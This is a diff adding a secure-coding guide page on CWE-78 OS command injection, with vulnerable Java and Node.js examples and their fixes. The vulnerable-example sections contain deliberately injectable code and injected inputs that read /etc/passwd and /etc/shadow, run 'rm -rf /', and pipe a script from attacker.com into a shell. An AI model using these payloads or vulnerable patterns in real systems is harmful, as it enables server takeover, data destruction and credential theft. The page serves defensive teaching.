@@ -1,0 +1,355 @@
+<!-- Overview -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-3">Why Is This an Issue?</h3>
+    <p class="text-gray-300 leading-relaxed mb-4">
+        CWE-78 flags code that constructs operating system commands from untrusted input and executes
+        them via a system shell. Unlike code injection (CWE-94), which targets the application's own
+        runtime, command injection targets the <strong class="text-gray-200">underlying operating system</strong>
+        — giving an attacker the ability to run arbitrary OS commands with the full privileges of the
+        application process.
+    </p>
+    <p class="text-gray-300 leading-relaxed mb-4">
+        The root cause is almost always <strong class="text-gray-200">string concatenation</strong> of user
+        input into a shell command. Attackers exploit shell metacharacters like <code
+            class="bg-gray-800 px-1.5 py-0.5 rounded text-red-400">;</code>,
+        <code class="bg-gray-800 px-1.5 py-0.5 rounded text-red-400">|</code>,
+        <code class="bg-gray-800 px-1.5 py-0.5 rounded text-red-400">&amp;&amp;</code>, or
+        <code class="bg-gray-800 px-1.5 py-0.5 rounded text-red-400">$(…)</code> to chain their own commands
+        onto the intended one. A single unvalidated parameter can lead to full server compromise.
+    </p>
+    <p class="text-gray-300 leading-relaxed">
+        This weakness is ranked in the <strong class="text-gray-200">SANS/CWE Top 25</strong> and maps to
+        <strong class="text-gray-200">OWASP A03:2021 — Injection</strong>. The safest approach is to
+        <strong class="text-gray-200">avoid invoking OS commands altogether</strong>. When that isn't possible,
+        use parameterized APIs that never pass input through a shell interpreter.
+    </p>
+</div>
+
+<!-- Vulnerable Examples -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">Examples of the Issue</h3>
+    <div class="space-y-6">
+
+        <!-- Example 1: Java Runtime.exec() with string concatenation -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: Java Runtime.exec() with concatenated user input
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                A servlet accepts a hostname from the user and passes it directly to
+                <code class="text-red-400">Runtime.exec()</code> as a single concatenated string. An attacker
+                can submit <code class="text-red-400">google.com; cat /etc/passwd</code> to execute arbitrary
+                commands after the intended <code class="text-red-400">ping</code>.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: User input concatenated directly into a shell command.
+@WebServlet("/ping")
+public class PingServlet extends HttpServlet {
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
+            throws ServletException, IOException {
+
+        String host = req.getParameter("host"); // e.g. "google.com" or "google.com; rm -rf /"
+
+        // The single-string form is parsed by the OS shell, which interprets
+        // semicolons, pipes, and other metacharacters.
+        Process proc = Runtime.getRuntime().exec("ping -c 3 " + host);
+
+        try (BufferedReader reader = new BufferedReader(
+                new InputStreamReader(proc.getInputStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                resp.getWriter().println(line);
+            }
+        }
+    }
+}</code></div>
+        </div>
+
+        <!-- Example 2: Node.js child_process.exec() -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: Node.js child_process.exec() with user input
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                <code class="text-red-400">child_process.exec()</code> spawns a shell (<code
+                    class="text-red-400">/bin/sh</code>)
+                and passes the entire string to it. An attacker can exploit shell operators like
+                <code class="text-red-400">$(…)</code> or <code class="text-red-400">|</code> to chain
+                arbitrary commands. For example, submitting <code
+                    class="text-red-400">; curl attacker.com/shell.sh | sh</code>
+                downloads and runs a reverse shell.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: exec() spawns a shell and interprets all metacharacters.
+const { exec } = require('child_process');
+const express = require('express');
+const app = express();
+
+app.get('/lookup', (req, res) =&gt; {
+    const domain = req.query.domain; // e.g. "example.com" or "; cat /etc/shadow"
+
+    // The shell interprets semicolons, pipes, backticks, $(), etc.
+    exec(`nslookup ${domain}`, (err, stdout, stderr) =&gt; {
+        if (err) return res.status(500).json({ error: stderr });
+        res.json({ output: stdout });
+    });
+});</code></div>
+        </div>
+
+        <!-- Example 3: Java ProcessBuilder with shell invocation -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-gray-800">
+            <h4 class="font-semibold text-red-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
+                    <path d="M12 9v4" />
+                    <path d="M12 17h.01" />
+                </svg>
+                Dangerous: ProcessBuilder through a shell (sh -c)
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                Using <code class="text-red-400">ProcessBuilder</code> with <code class="text-red-400">sh -c</code>
+                (or <code class="text-red-400">cmd /c</code> on Windows) defeats the safety of its argument-list
+                API. The third argument is passed to the shell as a single string, re-introducing the same
+                metacharacter injection risk as <code class="text-red-400">Runtime.exec()</code>.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// DANGEROUS: Invoking "sh -c" passes everything through a shell interpreter.
+String filename = request.getParameter("file"); // e.g. "report.pdf" or "; rm -rf /"
+
+ProcessBuilder pb = new ProcessBuilder("sh", "-c", "cat /opt/reports/" + filename);
+pb.redirectErrorStream(true);
+Process proc = pb.start();
+
+try (BufferedReader reader = new BufferedReader(
+        new InputStreamReader(proc.getInputStream()))) {
+    String line;
+    while ((line = reader.readLine()) != null) {
+        response.getWriter().println(line);
+    }
+}</code></div>
+        </div>
+    </div>
+</div>
+
+<!-- Remediation -->
+<div class="mb-8">
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">How to Resolve</h3>
+    <div class="space-y-6">
+
+        <!-- Fix 1: Java - ProcessBuilder without shell -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Fix (Java): Use ProcessBuilder with an explicit argument list — no shell
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                <code class="text-green-400">ProcessBuilder</code> accepts arguments as a list. Each element is
+                passed directly to the OS as a separate <code class="text-green-400">argv</code> entry —
+                <strong class="text-gray-200">no shell is invoked</strong>, so metacharacters like
+                <code class="text-green-400">;</code> and <code class="text-green-400">|</code> are treated
+                as literal characters. Always combine this with input validation via an allowlist.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: Each argument is a separate list element — no shell interpretation.
+@WebServlet("/ping")
+public class PingServlet extends HttpServlet {
+    private static final Pattern HOSTNAME_PATTERN =
+            Pattern.compile("^[a-zA-Z0-9.\\-]+$"); // Allowlist: hostname chars only
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
+            throws ServletException, IOException {
+
+        String host = req.getParameter("host");
+
+        // Step 1: Validate against an allowlist.
+        if (host == null || !HOSTNAME_PATTERN.matcher(host).matches()) {
+            resp.sendError(400, "Invalid hostname.");
+            return;
+        }
+
+        // Step 2: Pass arguments as a list — never concatenate into a string.
+        ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host);
+        pb.redirectErrorStream(true);
+        Process proc = pb.start();
+
+        try (BufferedReader reader = new BufferedReader(
+                new InputStreamReader(proc.getInputStream()))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                resp.getWriter().println(line);
+            }
+        }
+    }
+}</code></div>
+        </div>
+
+        <!-- Fix 2: Node.js - execFile() instead of exec() -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Fix (JS): Replace exec() with execFile() — no shell spawned
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                <code class="text-green-400">child_process.execFile()</code> executes the binary directly
+                without spawning a shell. Arguments are passed as an array, making shell metacharacter injection
+                impossible. Always pair this with input validation to restrict values to expected patterns.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: execFile() does NOT spawn a shell — metacharacters are harmless.
+const { execFile } = require('child_process');
+const express = require('express');
+const app = express();
+
+app.get('/lookup', (req, res) =&gt; {
+    const domain = req.query.domain;
+
+    // Step 1: Allowlist validation — hostname characters only.
+    if (!/^[a-zA-Z0-9.\-]+$/.test(domain)) {
+        return res.status(400).json({ error: 'Invalid domain' });
+    }
+
+    // Step 2: execFile passes args as argv — no shell interpretation.
+    execFile('nslookup', [domain], (err, stdout, stderr) =&gt; {
+        if (err) return res.status(500).json({ error: stderr });
+        res.json({ output: stdout });
+    });
+});</code></div>
+        </div>
+
+        <!-- Fix 3: Avoid OS commands entirely -->
+        <div class="bg-gray-900 p-5 rounded-xl border border-green-900/50">
+            <h4 class="font-semibold text-green-400 mb-2 flex items-center">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2">
+                    <path d="M20 6 9 17l-5-5" />
+                </svg>
+                Fix (Java): Avoid OS commands entirely — use native APIs
+            </h4>
+            <p class="text-gray-400 text-sm mb-3">
+                The <strong class="text-gray-200">safest fix</strong> is to eliminate the OS command entirely.
+                Java and Node.js both have built-in APIs for common tasks like DNS lookups, file operations,
+                and network checks. Using native APIs removes the entire attack surface — there is no command
+                string to inject into.
+            </p>
+            <div class="code-block mt-2"><button class="copy-btn">Copy</button><code>// SAFE: Use Java's built-in InetAddress instead of shelling out to "ping".
+import java.net.InetAddress;
+
+@WebServlet("/ping")
+public class PingServlet extends HttpServlet {
+    private static final Pattern HOSTNAME_PATTERN =
+            Pattern.compile("^[a-zA-Z0-9.\\-]+$");
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
+            throws ServletException, IOException {
+
+        String host = req.getParameter("host");
+
+        if (host == null || !HOSTNAME_PATTERN.matcher(host).matches()) {
+            resp.sendError(400, "Invalid hostname.");
+            return;
+        }
+
+        try {
+            InetAddress address = InetAddress.getByName(host);
+            boolean reachable = address.isReachable(5000); // 5-second timeout
+
+            resp.getWriter().printf("Host: %s (%s) — %s%n",
+                    host, address.getHostAddress(),
+                    reachable ? "Reachable" : "Unreachable");
+        } catch (Exception e) {
+            resp.sendError(400, "Could not resolve hostname.");
+        }
+    }
+}</code></div>
+        </div>
+    </div>
+</div>
+
+<!-- References -->
+<div>
+    <h3 class="text-xl font-semibold text-blue-300 mb-4">References</h3>
+    <div class="grid sm:grid-cols-2 gap-3">
+        <a href="https://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">MITRE CWE-78</p>
+                <p class="text-xs text-gray-500">Official CWE definition and examples</p>
+            </div>
+        </a>
+
+        <a href="https://owasp.org/Top10/A03_2021-Injection/" target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">OWASP A03:2021 —
+                    Injection</p>
+                <p class="text-xs text-gray-500">Top 10 category covering command, code, and SQL injection</p>
+            </div>
+        </a>
+
+        <a href="https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
+            target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">OWASP OS Command
+                    Injection Defense Cheat Sheet</p>
+                <p class="text-xs text-gray-500">Prevention strategies and safe API patterns</p>
+            </div>
+        </a>
+
+        <a href="https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback"
+            target="_blank" rel="noopener noreferrer"
+            class="flex items-center bg-gray-900 p-4 rounded-lg border border-gray-800 hover:border-blue-600 transition group">
+            <span class="text-blue-400 mr-3 group-hover:text-blue-300 transition">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                    stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                    <polyline points="15 3 21 3 21 9" />
+                    <line x1="10" x2="21" y1="14" y2="3" />
+                </svg>
+            </span>
+            <div>
+                <p class="text-sm font-semibold text-gray-200 group-hover:text-white transition">Node.js —
+                    child_process.execFile() Docs</p>
+                <p class="text-xs text-gray-500">Official API docs for the safe alternative to exec()</p>
+            </div>
+        </a>
+    </div>
+</div>
